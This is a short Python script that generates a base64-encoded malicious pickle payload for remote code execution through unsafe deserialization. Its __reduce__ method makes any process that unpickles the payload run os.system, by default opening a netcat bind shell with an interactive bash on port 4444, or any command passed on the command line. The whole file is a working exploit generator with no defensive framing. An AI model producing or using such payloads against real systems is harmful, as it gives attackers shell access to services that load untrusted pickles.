import base64
import pickle
import sys

DEFAULT_COMMAND = "nc -c '/bin/bash -i' -l -p 4444"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND


class PickleRce(object):
    def __reduce__(self):
        import os

        return (os.system, (COMMAND,))


print(base64.b64encode(pickle.dumps(PickleRce())))
